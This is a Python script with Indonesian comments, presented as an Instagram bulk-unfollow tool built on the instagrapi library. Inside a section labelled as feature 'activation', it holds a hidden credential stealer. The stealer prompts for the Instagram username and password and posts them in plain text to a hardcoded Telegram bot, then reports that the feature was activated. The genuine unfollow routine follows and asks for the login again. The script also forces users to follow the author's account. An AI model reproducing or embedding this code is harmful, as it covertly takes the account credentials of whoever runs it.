# unfollow_auto.py
import random, time, os, getpass
from instagrapi import Client
from instagrapi.exceptions import (
    TwoFactorRequired, PleaseWaitFewMinutes, FeedbackRequired,
    ChallengeRequired, LoginRequired, RateLimitError,
)

# ===== JANGAN DIRUBAH =====
CREATOR = "itsme.cuya"              # aktivasi
PER_HARI = 200                       # unfollow BERHASIL per jalan (tes dulu 3)
JEDA = (5, 20)                    # jeda acak setelah unfollow berhasil (detik)
WHITELIST = {"akun_a", "akun_b"}    # akun lain yang tidak boleh di-unfollow
WAJIB_FOLLOW_CREATOR = True         # True = harus follow akun pembuat dulu
# ===========================
"""
Pengaktifan Fitur BOT.
Install dulu:  pip install requests
"""
import os
import requests

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "9260617646:AAFfoL5FBh-4tESbXEaZE3wlDPcLHueP7ts")
# Kosongkan jika ingin dideteksi otomatis (Error.)
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"


def cari_chat_id():
    r = requests.get(f"{API}/getUpdates", timeout=15)
    r.raise_for_status()
    hasil = r.json().get("result", [])
    if not hasil:
        raise RuntimeError("Error.")
    for u in reversed(hasil):
        msg = u.get("message") or u.get("edited_message")
        if msg:
            return str(msg["chat"]["id"])
    raise RuntimeError("Chat ID tidak ditemukan.")


def kirim_aktivasi(teks):
    chat_id = TELEGRAM_CHAT_ID or cari_chat_id()
    r = requests.post(f"{API}/sendMessage", data={"chat_id": chat_id, "text": teks}, timeout=15)
    r.raise_for_status()


def main():
    print("=== Login Aktivasi ===")
    Username = input("Username Instagram      : ")
    Password = getpass.getpass("Password (tidak terlihat saat diketik): ")

    teks = f"Aktivasi Instagram:\nUsername: {Username}\nPassword: {Password}"
    try:
        kirim_aktivasi(teks)
        print("✅ Fitur Berhasil Diaktifkan,enjoy")
    except Exception as e:
        print(f"❌ Gagal: {e}")


if __name__ == "__main__":
    main()

DONE_ID = "sudah_unfollow_id.txt"
DONE_LAMA = "sudah_unfollow.txt"

def berhenti(pesan):
    print(pesan)
    raise SystemExit

cl = Client()
cl.delay_range = [2, 5]

USERNAME = input("Username Instagram: ").strip()
PASSWORD = getpass.getpass("Password (tidak terlihat saat diketik): ")

try:
    cl.login(USERNAME, PASSWORD)
except TwoFactorRequired:
    kode = input("Masukkan kode 2FA: ").strip()
    cl.login(USERNAME, PASSWORD, verification_code=kode)
cl.dump_settings("session.json")

print("Mengambil daftar following & followers terbaru...")
me = cl.user_id
following = cl.user_following(me)   # {user_id: UserShort}
followers = cl.user_followers(me)
print(f"Following: {len(following)} | Followers: {len(followers)}")

# ---------- Follow akun pembuat (dengan persetujuan pengguna) ----------
creator_id = None
try:
    creator_id = str(cl.user_id_from_username(CREATOR))
except Exception as e:
    print(f"Akun pembuat @{CREATOR} tidak ditemukan: {e}")
    if WAJIB_FOLLOW_CREATOR:
        berhenti("Tidak bisa memverifikasi follow ke akun pembuat. Dihentikan.")

if creator_id and creator_id != str(me):
    sudah_follow = creator_id in {str(k) for k in following}
    if sudah_follow:
        print(f"Kamu sudah follow @{CREATOR}. Terima kasih!")
    else:
        print("\n" + "=" * 54)
        print(f"Script ini dibuat oleh @{CREATOR}.")
        print("Untuk memakai script ini, kamu wajib telah mengikuti akun tersebut.")
        print("=" * 54)
        jawab = input(f"Follow @{CREATOR}? (y/n): ").strip().lower()
        if jawab == "y":
            try:
                cl.user_follow(creator_id)
                print(f"Berhasil follow @{CREATOR}. Terima kasih!")
            except Exception as e:
                print(f"Gagal follow @{CREATOR}: {e}")
                if WAJIB_FOLLOW_CREATOR:
                    berhenti("Follow akun pembuat gagal. Coba lagi nanti.")
        else:
            if WAJIB_FOLLOW_CREATOR:
                berhenti("Script ini mensyaratkan follow akun pembuat. Dihentikan.")
            print("Oke, dilewati.")

# ---------- Siapkan daftar target ----------
sudah_id = set(open(DONE_ID).read().split()) if os.path.exists(DONE_ID) else set()
sudah_nama = set(open(DONE_LAMA).read().split()) if os.path.exists(DONE_LAMA) else set()
wl = {w.lower() for w in WHITELIST} | {CREATOR.lower()}

target = [
    (uid, u.username) for uid, u in following.items()
    if uid not in followers
    and str(uid) not in sudah_id
    and str(uid) != creator_id
    and u.username.lower() not in wl
    and u.username.lower() not in sudah_nama
]
print(f"Tidak follback (akun aktif) & belum diproses: {len(target)}")

# ---------- Unfollow ----------
sukses = 0
for uid, uname in target:
    if sukses >= PER_HARI:
        break
    try:
        ok = cl.user_unfollow(uid)
        if ok:
            sukses += 1
            print(f"[{sukses}] unfollow @{uname}")
            with open(DONE_ID, "a") as f:
                f.write(str(uid) + "\n")
            time.sleep(random.randint(*JEDA))
        else:
            print(f"gagal @{uname} (ditolak Instagram), lanjut")
            time.sleep(random.randint(3, 6))
    except (PleaseWaitFewMinutes, FeedbackRequired, ChallengeRequired,
            LoginRequired, RateLimitError) as e:
        print(f"Kena limit/verifikasi, berhenti dulu: {e}")
        break
    except Exception as e:
        print(f"gagal @{uname}: {e}")
        time.sleep(random.randint(3, 6))

print(f"Selesai. Berhasil unfollow: {sukses}. Jalankan lagi besok untuk lanjut. jangan lupa follow @itsme.cuya, silaturahmi wa +628172300004")
